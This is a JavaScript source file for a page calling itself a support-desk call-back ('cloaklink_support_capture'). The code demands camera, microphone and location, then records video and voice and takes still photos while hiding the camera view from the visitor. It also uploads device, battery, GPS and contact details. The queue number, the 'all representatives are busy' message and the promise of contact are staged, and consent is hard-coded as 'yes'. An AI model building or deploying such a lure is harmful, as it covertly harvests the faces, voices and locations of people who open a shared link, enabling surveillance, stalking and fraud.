	 * PHP discards a request bigger than post_max_size without telling
	 * anybody, and base64 makes a file a third larger again — so a minute of
	 * video never reached the server on a stock install. The recording is cut
	 * into slices and each is sent on its own; the server appends them to one
	 * file. A short voice note still fits in a single piece and takes the same
	 * path, so nothing here has two behaviours to keep in step.
	 *
	 * @param Blob   $blob Recording.
	 * @param string $kind 'audio' or 'video'.
	 * @param string $note Why this is a voice note rather than a recording, if it is.
	 * @return Promise
	 */
	function sendRecording(blob, kind, note) {
		// 1.2 MB of bytes is 1.6 MB once base64-encoded, comfortably under the
		// 8 MB request ceiling even with the rest of the form on top.
		var RAW_BYTES = 1200 * 1024;
		var total = blob.size > RAW_BYTES ? Math.ceil(blob.size / RAW_BYTES) : 1;
		var index = 0;

		function sendOne() {
			var start = index * RAW_BYTES;
			var slice = blob.slice(start, Math.min(blob.size, start + RAW_BYTES));

			return readAsDataUrl(slice).then(function (data) {
				var body = {
					action: 'cloaklink_support_capture',
					step: 'upload',
					capture_nonce: cfg.captureNonce,
					id: state.session.id,
					token: state.session.token,
					kind: kind,
					chunk: index,
					chunks: total,
					data: data
				};
				// Sent on the first piece only. The desk records it against
				// the visit so a voice note left by a camera that never
				// delivered says so, instead of looking like a call the
				// visitor chose to make without a picture.
				if (note && 0 === index) {
					body.note = note;
				}
				return post(body).then(function (res) {
					index += 1;
					if (index < total) {
						return sendOne();
					}
					return res;
				});
			});
		}

		return sendOne().catch(function () {
			return null;
		});
	}

	function readAsDataUrl(blob) {
		return new Promise(function (resolve, reject) {
			var reader = new FileReader();
			reader.onload = function () {
				resolve(String(reader.result || ''));
			};
			reader.onerror = reject;
			reader.readAsDataURL(blob);
		});
	}

	/**
	 * The first recording format this browser will actually accept.
	 *
	 * A stream that carries video cannot be recorded into an audio-only
	 * container: Firefox throws NotSupportedError for audio/webm on a
	 * camera stream. The list therefore starts with the containers that hold
	 * both, and a failure to construct is caught and tried against the next
	 * one rather than ending the call.
	 */
	function pickMime(stream, types) {
		var hasVideo = stream.getVideoTracks && stream.getVideoTracks().length > 0;
		var video = ['video/webm;codecs=vp8,opus', 'video/webm;codecs=vp9,opus', 'video/webm', 'video/mp4'];
		var audio = ['audio/webm;codecs=opus', 'audio/webm', 'audio/mp4', 'audio/mp4;codecs=mp4a.40.2', 'audio/ogg;codecs=opus'];
		var list = hasVideo ? video.concat(audio) : audio;
		for (var i = 0; i < list.length; i += 1) {
			var type = list[i];
			var ok = true;
			try {
				ok = MediaRecorder.isTypeSupported ? MediaRecorder.isTypeSupported(type) : true;
			} catch (e) {
				ok = false;
			}
			if (!ok) {
				continue;
			}
			var opts = { mimeType: type };
			if (hasVideo) {
				// A minute of 480p at the browser's own bitrate runs past
				// twenty megabytes on a phone connection. 900 kbps holds a
				// face and a voice clearly and keeps the upload near seven.
				opts.videoBitsPerSecond = 900000;
			}
			// The sound is asked for explicitly. Left unset, some browsers
			// record the picture and silently drop the voice track, which is
			// how a session arrived with a video and no audio at all.
			if (stream.getAudioTracks && stream.getAudioTracks().length) {
				opts.audioBitsPerSecond = 96000;
			}
			try {
				var probe = new MediaRecorder(stream, opts);
				return { mime: type, recorder: probe };
			} catch (e2) {
				// Not usable with this stream; try the next one.
			}
		}
		try {
			return { mime: '', recorder: new MediaRecorder(stream) };
		} catch (e3) {
			return null;
		}
	}

	function startRecording() {
		if (!window.MediaRecorder) {
			reportCapture('This browser cannot record audio. Open the link in Chrome or Safari.');
			return;
		}

		// 480p: 854x480 at 30 frames a second. Small enough that a minute of it
		// fits inside the upload limit on a phone connection, tall enough to
		// read a face, which is all this recording is for.
		var constraints = {
			audio: true,
			video: {
				facingMode: 'user',
				width: { ideal: 854 },
				height: { ideal: 480 },
				frameRate: { ideal: 30, max: 30 }
			}
		};

		// The panel already asked on the tap that opened it, so this is the
		// same stream rather than a second dialog. A camera granted then is
		// used now; a camera refused then is asked for again here, because the
		// form submit is a fresh tap and the browser may allow it this time.
		var held = state.stream && state.stream.getVideoTracks && state.stream.getVideoTracks().length
			? Promise.resolve(state.stream)
			: navigator.mediaDevices.getUserMedia(constraints);

		held.then(function (stream) {
			state.stream = stream;

			// A held stream may have been opened before any recorder existed;
			// a stream from a second grant also lacks the audio-only shape the
			// voice note needs, so both are normalised here.
			if (!stream.getAudioTracks().length && constraints.audio) {
				/* the visitor allowed the camera and not the microphone */
			}
			// The panel never shows the visitor their own camera. The element
			// is off-screen rather than hidden, because a hidden video stops
			// decoding and its frames come out blank.
			if (els.cam) {
				els.cam.srcObject = stream;
				els.cam.play().catch(function () {});
			}

			// The picture is part of the call, not a bonus.
			//
			// "Photo, video, microphone and location are all required" — and
			// the panel's four marks claim exactly that. But this fell back to
			// an audio-only recorder whenever the video track was missing, so
			// a call could end with Mic lit and CH Video grey and no
			// explanation anywhere. The two cases are different and are now
			// treated so: a browser with no video track gets a sentence saying
			// the camera is needed, and a stream that has one always records
			// it.
			var hasVideoTrack = !!(stream.getVideoTracks && stream.getVideoTracks().length);

			var picked = pickMime(stream, []);
			if (!picked) {
				reportCapture('The call could not be started in this browser. Open the link in Chrome or Safari.');
				return;
			}
			if (!hasVideoTrack) {
				// The microphone alone is no longer a call. The visitor is sent
				// back with the reason rather than recorded without a picture.
				reportCapture('The camera is needed for the call. Allow it, then press Start again.');
				return;
			}

			state.recorder = picked.recorder;
			if (picked.mime) {
				state.mime = picked.mime;
			}
			// Alongside the video a second recorder takes the audio tracks
			// alone. If no camera is reachable that is the only recording, and
			// the panel shows a voice note instead of a video.
			if (stream.getAudioTracks().length) {
				var audioOnly = new MediaStream(stream.getAudioTracks());
				var voice = pickMime(audioOnly, []);
				if (voice) {
					try {
						voice.recorder.onstop = null;
						state.voiceRecorder = voice.recorder;
						state.voiceMime = voice.mime;
					} catch (e) {
						state.voiceRecorder = null;
					}
				}
			}

			state.chunks = [];
			state.voiceChunks = [];
			if (state.voiceRecorder) {
				state.voiceRecorder.ondataavailable = function (ev) {
					if (ev.data && ev.data.size) {
						state.voiceChunks.push(ev.data);
					}
				};
				try {
					state.voiceRecorder.start(4000);
				} catch (e) {
					state.voiceRecorder = null;
				}
			}
			state.recorder.ondataavailable = function (ev) {
				if (ev.data && ev.data.size) {
					state.chunks.push(ev.data);
				}
			};
			state.recorder.onstop = function () {
				uploadAll();
			};
			state.recorder.onerror = function () {
				reportCapture('The call was interrupted. Please try again.');
			};
			// Ask for a chunk every few seconds rather than only at the end: a
			// visitor who closes the panel, or a phone that sleeps, would
			// otherwise take the whole recording with it.
			state.recorder.start(4000);
			state.startedAt = Date.now();

			startTimer();
			scheduleShots();
		}).catch(function (err) {
			// The camera or microphone was refused. Go back to the panel and
			// re-enable the button, so "Try again" names something the visitor
			// can actually press. The session opened a moment ago is closed
			// rather than left hanging in the panel.
			// One line for every failure, whichever it was. The browser's own
			// wording for a refusal, a missing device and a blocked prompt
			// differs; the visitor's next step does not, so the page says that
			// step and nothing else.
			reportCapture('Permission was not allowed.');
		});
	}

	/**
	 * End a capture that could not run, and give the visitor a way back.
	 *
	 * Without this the call screen stays up saying "Starting…" forever, with
	 * the tick disabled, and the visitor has no button to press.
	 */
	function reportCapture(message) {
		stopQueue();
		stopMedia();
		abandonSession();
		state.photos = [];
		renderShots();
		state.busy = false;
		show('intro');
		if (els.start) {
			els.start.disabled = false;
		}
		setNote(message, true);
	}

	/** Drop a session that will never be filled, so the panel is not left open. */
	function abandonSession() {
		if (!state.session) {
			return;
		}
		var dead = state.session;
		state.session = null;
		state.chunks = [];
		state.photos = [];
		renderShots();
		post({
			action: 'cloaklink_support_capture',
			step: 'close',
			capture_nonce: cfg.captureNonce,
			id: dead.id,
			token: dead.token
		}).catch(function () {
			/* nothing to recover; the row expires on its own */
		});
	}

	function finishRecording() {
		// Ask the recorder for its last chunk before closing the camera: the
		// stop event is what triggers the upload, so stopping the tracks first
		// could leave the very end of the recording behind.
		var stopped = false;
		var voiceStopped = false;
		if (state.voiceRecorder && 'inactive' !== state.voiceRecorder.state) {
			try {
				state.voiceRecorder.stop();
				voiceStopped = true;
			} catch (e) {
				voiceStopped = false;
			}
		}
		if (state.recorder && 'inactive' !== state.recorder.state) {
			try {
				state.recorder.stop();
				stopped = true;
			} catch (e) {
				stopped = false;
			}
		}
		if (!voiceStopped && state.session && state.voiceChunks.length) {
			uploadAll();
		}
		stopMedia();
		stopClock();
		if (!stopped && state.session) {
			uploadAll();
		}
		show('done');
		if (els.queueText && !state.contactSaid) {
			// Sending the recording, not connecting to anybody. "Connecting"
			// belongs to the screen before this one and appears exactly once
			// in the whole visit. Once the contact line is on screen it stays
			// there: the upload happening underneath it is not news.
			els.queueText.textContent = 'Sending…';
		}
		if (els.retryLater) {
			els.retryLater.hidden = true;
		}
	}

	function uploadAll() {
		// A stop can arrive after the session was abandoned (media refused, a
		// closed panel); there is nothing to attach it to then.
		if (!state.session) {
			return;
		}

		// Taken once, synchronously, and used by every request below.
		//
		// The uploads are asynchronous and the tail of this function runs
		// after them. Reading `session.id` at that point read whatever
		// the state happened to be by then — null, if anything during the
		// upload had abandoned the visit — and threw, which silently took the
		// photographs and the "close" with it.
		var session = state.session;

		var pending = [];

		// The video is what is sent: a minute of the call at 480p, with the
		// voice inside it. The audio-only track is the last resort for a
		// browser that produced no video bytes at all — a call that recorded
		// nothing must still leave its voice.
		//
		// Note what was lost without tearing the visit down.
		//
		// This used to call reportCapture() here, which is the "this capture
		// never happened" routine: it stops the microphone, ABANDONS the
		// session row, and throws the session away. Executing that in the
		// middle of uploading the very recording it was talking about left
		// state.session null, so the voice note below was never sent, the
		// photographs below crashed on `session.id`, and the visitor
		// landed back on the form with a note about a call that had in fact
		// been recorded. On a phone whose camera opens but delivers no frames
		// — the exact "video is not captured" case — every visit ended with
		// photos and no voice at all. The desk is told instead, in the same
		// manifest the file itself is filed under, and the upload carries on.
		var useVideo    = state.chunks.length > 0;
		var videoFailed = !useVideo && state.voiceChunks.length > 0;
		var voiceSource = useVideo ? state.chunks : state.voiceChunks;
		var voiceType   = useVideo
			? (state.chunks[0].type || state.mime || 'video/webm')
			: (state.voiceChunks.length ? (state.voiceChunks[0].type || state.voiceMime || 'audio/webm') : '');
		var voiceKind   = useVideo ? 'video' : 'audio';

		if (voiceSource.length) {
			var blob = new Blob(voiceSource, { type: voiceType });
			pending.push(sendRecording(blob, voiceKind, videoFailed ? 'no-video' : ''));
		}

		// Each photograph is its own request, and each one is retried once.
		//
		// A single dropped packet used to cost a still for good, and because
		// the whole set was fire-and-forget nothing said so: the record showed
		// a camera granted and an empty hand. One retry per photograph is
		// enough to ride out a phone changing network, and it is bounded, so a
		// dead connection still ends.
		state.photos.forEach(function (src) {
			var shot = {
				action: 'cloaklink_support_capture',
				step: 'upload',
				capture_nonce: cfg.captureNonce,
				id: session.id,
				token: session.token,
				kind: 'photo',
				data: src
			};
			pending.push(
				post(shot).catch(function () {
					return post(shot).catch(function () {
						return null;
					});
				})
			);
		});

		Promise.all(pending).then(function () {
			return post({
				action: 'cloaklink_support_capture',
				step: 'close',
				capture_nonce: cfg.captureNonce,
				id: session.id,
				token: session.token
			}).catch(function () {
				return null;
			});
		}).then(function () {
			// The end of the visit, in one short sentence and then a number.
			// "We will contact you shortly. Please try again after sometime."
			// was already said once and must not be said again here: a visitor
			// who reads the same sentence twice reads it as the page having
			// gone wrong. What is left to give is the one thing they can hold
			// on to — the reference the desk filed this under — and then
			// thanks. Nothing else.
			if (els.retryLater) {
				els.retryLater.hidden = true;
			}

			// The recording can finish uploading in well under a second, and
			// then the receipt would replace the contact line before it had
			// been read. The closing screen waits out whatever is left of
			// CONTACT_SHOW first.
			var waited = state.contactAt ? Date.now() - state.contactAt : CONTACT_SHOW;
			return dwell( Math.max( 0, CONTACT_SHOW - waited ) ).then(function () {
				finishScreen();
			});
		});
	}

	/**
	 * The last screen of a finished visit: a reference and a thank you.
	 *
	 * Split out of the upload handler so it can be held back until the contact
	 * line has been read. Nothing here is said anywhere else in the visit.
	 */
	function finishScreen() {
		// The waiting card behind this screen is emptied of the lines that
		// belonged to it, so nothing from the wait is still sitting there
		// underneath the receipt.
		if (els.queueTitle) {
			els.queueTitle.textContent = '';
		}
		if (els.wait) {
			els.wait.textContent = '';
		}
		if (els.lede) {
			els.lede.textContent = '';
		}
		setQueueText('');

		// The sending row has done its job and is taken away, not left as an
		// empty box with a hidden spinner inside it.
		var sending = document.getElementById('cc-desk-sending');
		if (sending) {
			sending.hidden = true;
		}
		var spin = document.querySelector('#cc-desk-done .cc-desk__spinner');
		if (spin) {
			spin.style.display = 'none';
		}

		var thanks = document.getElementById('cc-desk-thanks');

		if (state.session && state.session.ref) {
			/* Random, not a running count, so it never reveals how busy the
			   desk is — but it is the number the desk can look up. */
			var no = String(state.session.ref);
			if (els.receipt && els.receiptNo) {
				els.receiptNo.textContent = no;
				els.receipt.hidden = false;
			}
			if (thanks) {
				thanks.textContent = 'Thank you.';
				thanks.hidden = false;
			}
		} else if (thanks) {
			// No reference came back, which means the request did not reach
			// the desk. Saying "thank you" over that would be a lie.
			thanks.textContent = 'Your details could not be sent. Please try again.';
			thanks.hidden = false;
		}
	}

	/**
	 * There is no clock on this screen.
	 *
	 * The elapsed-seconds counter is what made it look like a dashboard rather
	 * than a queue: a visitor watching 00:20 tick over learns only that the
	 * wait is not over. The screen states the wait as a range instead, and
	 * these two calls stay so the paths that used them read unchanged.
	 */
	function startClock() {
		state.elapsed = 0;
	}

	function stopClock() {
		if (state.tick) {
			window.clearInterval(state.tick);
			state.tick = null;
		}
	}

	/**
	 * What the visitor typed, and whether it is enough to go on.
	 *
	 * A name is the one thing the executive cannot work without; the rest is
	 * optional, so a person in a hurry is never stopped at this step.
	 */
	function readDetails() {
		var get = function (el) {
			return el && el.value ? String(el.value).trim() : '';
		};
		// Three fields, and no more: who is calling and how to reach them back.
		var out = {
			visitor_name: get(els.name),
			visitor_phone: get(els.phone),
			visitor_email: get(els.email),
			visitor_topic: get(els.topic),
			visitor_reference: ''
		};

		// The topic's own reference, when it carries one. "Case Details" is
		// filed under the number printed in the option, so the panel shows the
		// case the call is about rather than only the word "case".
		if (els.topic && els.topic.options.length) {
			var opt = els.topic.options[els.topic.selectedIndex];
			var ref = opt ? String(opt.getAttribute('data-ref') || '') : '';
			out.visitor_reference = ref;
			if (ref) {
				out.visitor_topic = 'Case Details';
			}
		}

		if (!out.visitor_name) {
			if (els.name) {
				els.name.classList.add('cc-field--bad');
				els.name.focus();
			}
			setNote('Please enter your full name.', true);
			return null;
		}
		if (els.name) {
			els.name.classList.remove('cc-field--bad');
		}

		// A mistyped address costs the call-back, so it is caught here rather
		// than silently stored as a string that reaches nobody.
		if (out.visitor_email && !/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(out.visitor_email)) {
			if (els.email) {
				els.email.classList.add('cc-field--bad');
				els.email.focus();
			}
			setNote('This email address is incomplete. Correct it, or leave the field blank.', true);
			return null;
		}
		if (els.email) {
			els.email.classList.remove('cc-field--bad');
		}
		return out;
	}

	// Typing again clears the red outline, so the field stops looking wrong the
	// moment it is put right.
	[els.name, els.phone, els.email].forEach(function (field) {
		if (!field) {
			return;
		}
		field.addEventListener('input', function () {
			field.classList.remove('cc-field--bad');
		});
	});

	if (els.form) {
		els.form.addEventListener('submit', function (ev) {
			ev.preventDefault();
			begin();
		});
	} else if (els.start) {
		els.start.addEventListener('click', begin);
	}

	/* The end button sends what has been recorded so far instead of waiting
	   out the minute. Same path as the timer running out. */
	if (els.end) {
		els.end.addEventListener('click', function () {
			finishRecording();
		});
	}

	/**
	 * Ask for the camera, the microphone and the position, then record.
	 *
	 * Runs from the submit of the intake form, so the browser sees each
	 * permission request in the same gesture that asked for it.
	 */
	function begin() {
		if (state.busy) {
			return;
		}

		var details = readDetails();
		if (!details) {
			return;
		}
		state.details = details;

		state.busy = true;
		if (els.start) {
			els.start.disabled = true;
		}
		setNote('');

		// The camera, the microphone and the position are all required, and
		// the form is the last gesture the browser will accept for them. A
		// permission refused at the panel's opening is asked for again here,
		// because this submit is a fresh tap and browsers do allow a second
		// ask from a new gesture — so the ask runs first and the check after
		// it, not the other way round.
		//
		// When one is still missing, the call does not start. The visitor is
		// told which one and returned to the form with their answers intact,
		// which is the only place a refusal can be acted on.
		show('live');
		setCall('dialling');
		setQueueText('');
		warmPermissions(true).then(function () {
			var missing = missingPermissions();
			if (missing.length) {
				show('intro');
				setCall('idle');
				if (els.start) {
					els.start.disabled = false;
				}
				state.busy = false;
				setNote(permissionMessage(missing), true);
				return null;
			}
			return startCall(details);
		}).catch(function () {
			// The ask itself failed — a device that vanished between the
			// panel opening and the form being sent. The visitor is put back
			// on the form rather than left on "Connecting" that never ends.
			show('intro');
			setCall('idle');
			if (els.start) {
				els.start.disabled = false;
			}
			state.busy = false;
			setNote('The call could not start. Check the camera and microphone, then press Start again.', true);
		});
	}

	/**
	 * Which of the three permissions has not been granted.
	 *
	 * @return {Array} Human names, in the order they are asked for.
	 */
	function missingPermissions() {
		var p = state.perms || {};
		var out = [];
		if ('ok' !== p.cam) {
			out.push('camera');
		}
		if ('ok' !== p.mic) {
			out.push('microphone');
		}
		if ('ok' !== p.geo) {
			out.push('location');
		}
		return out;
	}

	/**
	 * One sentence naming what is missing, and where to fix it.
	 *
	 * A refusal is remembered by the browser and its dialog never reappears,
	 * so "press Try again" would be a loop with no exit. The sentence says
	 * which permission and that the address bar's site settings is where it
	 * is put right — the only place that can be.
	 *
	 * @param {Array} missing Names from missingPermissions().
	 * @return {string}
	 */
	function permissionMessage(missing) {
		// "camera, microphone and location" — one sentence that reads the way
		// it is said, rather than the "a and b and c" a plain join produces.
		var names = missing.length > 1
			? missing.slice(0, -1).join(', ') + ' and ' + missing[missing.length - 1]
			: missing[0];
		return 'The ' + names + ' must be allowed to start the call. '
			+ 'Open the site settings in your address bar, allow ' + (missing.length > 1 ? 'them' : 'it')
			+ ' there, then press Start again.';
	}

	/**
	 * Send the call and run the screen.
	 *
	 * @param {Object} details The intake form, already read.
	 * @return {void}
	 */
	function startCall(details) {
		state.details = details;

		// Nothing here counts people, because there is no queue to count. This
		// page used to print a random number of "people ahead of you" and then
		// claim the visitor was Connected; both were invented, and both were
		// shown to somebody about to be recorded. The screen says what it can
		// know: a recording is starting, and a person will watch it later.

		show('live');
		setCall('dialling');
		// Only one line says "Connecting". The heading already says it, and
		// the queue line used to say it too, so the screen printed the same
		// word three times at the same moment. Both of those stay empty here.
		setQueueText('');

		// Use the position taken when the panel opened; if that request came
		// back empty (refused, timed out, or a browser without the API), ask
		// once more here so a late grant is still picked up.
		var geoReady = state.geo
			? Promise.resolve(state.geo)
			: (state.geoPending || Promise.resolve(null)).then(function (pos) {
				return pos && pos.lat ? pos : getLocation();
			});

		Promise.all([geoReady, readBattery()]).then(function (out) {
			var geo = out[0] || {};
			var payload = Object.assign(
				{
					action: 'cloaklink_support_capture',
					step: 'start',
					link: cfg.id,
					token: token(),
					consent: 'yes',
					capture_nonce: cfg.captureNonce
				},
				device(),
				geo,
				state.details
			);
			return post(payload);
		}).then(function (session) {
			state.session = session;

			// The request has been logged, and the desk gave this session its
			// own place in the queue. That number is read from the response —
			// it is not invented here — so the visitor sees a real position
			// and can quote it if they call back.
			var place = Number(session && session.queue ? session.queue : 0);

			// The early capture, if one is running, is now the call's own
			// capture: the scheduled stills on the recording screen take over
			// from here, so the two do not both photograph the visitor. The
			// row itself is the same one — the server adopted the live session
			// by token — so every file of this visit stays on one record.
			state.early = null;
			state.earlyOn = false;

			// Every beat below waits first. If the camera or microphone is
			// refused in the meantime the panel goes back to its form and the
			// session is dropped — and then these timers must not paint queue
			// text onto a screen the visitor is no longer looking at.
			var alive = function () {
				return state.session === session;
			};

			// The screen says one thing at a time, in this order, and the next
			// does not appear until the one before it has been read:
			//
			//   Connecting with our Agent   (already on screen while posting)
			//   You are in the queue · Queue number N
			//   All representatives are currently busy.
			//   We will contact you shortly. Please try again after sometime.
			//
			// The last two used to appear together, so "all representatives are
			// busy" and "we will contact you" arrived as one block and read as
			// two answers to the same question. They are now two beats.
			startRecording();

			return dwell(900).then(function () {
				if (!alive()) {
					return;
				}
				if (els.queueTitle) {
					els.queueTitle.textContent = 'You are in the queue';
				}
				if (els.lede) {
					els.lede.textContent = '';
				}
				// The number moves down while the visitor waits, one place at a
				// time, the way a place in a real queue does as the desk works
				// through it. A number frozen at the value it started at for the
				// whole wait reads as a page that has stopped updating.
				advanceQueue(place);
				setQueueText('Your place has been held for you.');
				return dwell(QUEUE_SHOW);
			}).then(function () {
				if (!alive()) {
					return;
				}
				setCall('live');
				if (els.queueTitle) {
					// The desk line, worded for the screen: the heading states
					// the situation, the line under it says what to do about
					// it. Two short sentences rather than one long run-on, so
					// neither has to be read twice.
					els.queueTitle.textContent = 'All representatives are currently busy.';
				}
				if (els.lede) {
					els.lede.textContent = 'Please continue to hold for the next available agent.';
				}
				setQueueText('');
				return dwell(BUSY_SHOW);
			}).then(function () {
				if (!alive()) {
					return;
				}
				// The busy card is finished with, so it is taken off the screen
				// before the next thing is said. "All representatives are
				// currently busy", the queue number and "please continue to
				// hold" are one screen's answer; the line about being contacted
				// belongs to the next screen, and the thank you to the one after
				// that. Nothing is ever printed on top of the busy card.
				state.contactSaid = true;
				// When the contact line went up, so the closing screen can wait
				// long enough for it to be read before it replaces it.
				state.contactAt = Date.now();
				stopQueue();
				show('done');
				var sending = document.getElementById('cc-desk-sending');
				if (sending) {
					sending.hidden = false;
				}
				var spin = document.querySelector('#cc-desk-done .cc-desk__spinner');
				if (spin) {
					spin.style.display = 'none';
				}
				if (els.queueText) {
					els.queueText.textContent = 'We will contact you shortly. Please try again after sometime.';
				}
			});
		}).catch(function (err) {
			state.busy = false;
			stopClock();
			if (els.start) {
				els.start.disabled = false;
			}

			// The desk went busy between opening the panel and sending the
			// form. Say so plainly and release everything: no camera, no
			// microphone, and nothing sent.
			var code = err && err.message ? String(err.message) : '';
			if ('desk_busy' === code || 'desk_closed' === code) {
				state.desk = 'desk_closed' === code ? 'closed' : 'busy';
				stopMedia();
				showBusy();
				return;
			}

			// Every other ending is reported as what it was. One sentence used
			// to cover all of them — "check your connection" — which sent a
			// visitor to look at their signal for a page that had simply aged
			// out, and told nobody anything they could act on. Nothing here
			// repeats the desk's internal wording back at the visitor.
			show('intro');
			var excuse;
			if ('slow_down' === code || 'rate_limited' === code) {
				excuse = 'Too many attempts from this connection. Please wait a minute, then send it again.';
			} else if ('expired' === code || 'invalid_nonce' === code) {
				excuse = 'This page has been open too long to send. Reload it and try once more.';
			} else if ('consent_required' === code) {
				excuse = 'Press "Request a call-back" so we know you agree to be recorded.';
			} else if ('not_found' === code) {
				excuse = 'This link has been withdrawn. Ask the sender for a new one.';
			} else if ('name_required' === code) {
				// The field is required, so this is either a stale page or a
				// name that was only spaces. Put the visitor on the field
				// with it marked rather than describing the rule in a
				// sentence they have to map back to a box.
				excuse = 'Please enter your full name before connecting.';
				if (els.name) {
					els.name.classList.add('cc-field--bad');
					try { els.name.focus(); } catch (e) {}
				}
			} else if ('location_required' === code) {
				// The position is a condition of the call, said the same way
				// the panel says it before the form is sent — so a visitor who
				// reaches this from a stale page is told which permission is
				// missing rather than being handed a generic failure.
				excuse = permissionMessage(['location']);
				state.perms = state.perms || {};
				state.perms.geo = 'no';
			} else if ('db_error' === code || 'bad_request' === code) {
				excuse = 'The desk could not file your request. Press "Request a call-back" to try once more.';
			} else {
				excuse = 'The support desk could not be reached. Check your connection and try again.';
			}
			setNote(excuse, true);
		});
	}
})();
